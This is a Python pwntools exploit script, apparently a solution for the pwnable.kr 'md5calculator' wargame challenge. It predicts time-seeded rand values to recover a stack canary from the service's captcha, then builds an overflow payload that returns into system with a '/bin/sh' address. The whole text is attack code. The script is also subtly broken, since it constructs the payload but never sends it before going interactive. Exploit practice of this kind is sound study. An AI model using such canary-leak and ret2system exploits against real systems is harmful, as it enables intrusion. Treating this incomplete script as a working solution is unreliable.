from pwn import ssh
import ctypes
import time

libc = ctypes.CDLL("libc.so.6")
libc.srand.argtypes = (ctypes.c_uint,)
libc.rand.restype = ctypes.c_int

seed = int(time.time())
libc.srand(seed)

vals = [libc.rand() for _ in range(8)]

result = vals[5] + vals[1] + vals[2] - vals[3] + vals[7] + vals[4] - vals[6]
print("result:", result)

session = ssh(user='md5calculator', host='pwnable.kr', port=2222, password='guest')
p = session.process(['nc', '0', '9002'])

p.recvuntil(b'captcha : ')
captcha = p.recvline().strip()
print("captcha:", captcha)

canary = int(captcha.decode()) - result
canary = canary.to_bytes(4, 'little')
print("canary:", canary)

call_system_addr = b'\x87\x91\x04\x08'
print("call system address:", call_system_addr)

binsh_addr = b'\x9a\x9a\x0f\x08'
print("/bin/sh address:", binsh_addr)

payload = b'A' * 512 + canary + b'A' * 12 + call_system_addr + binsh_addr
p.interactive()
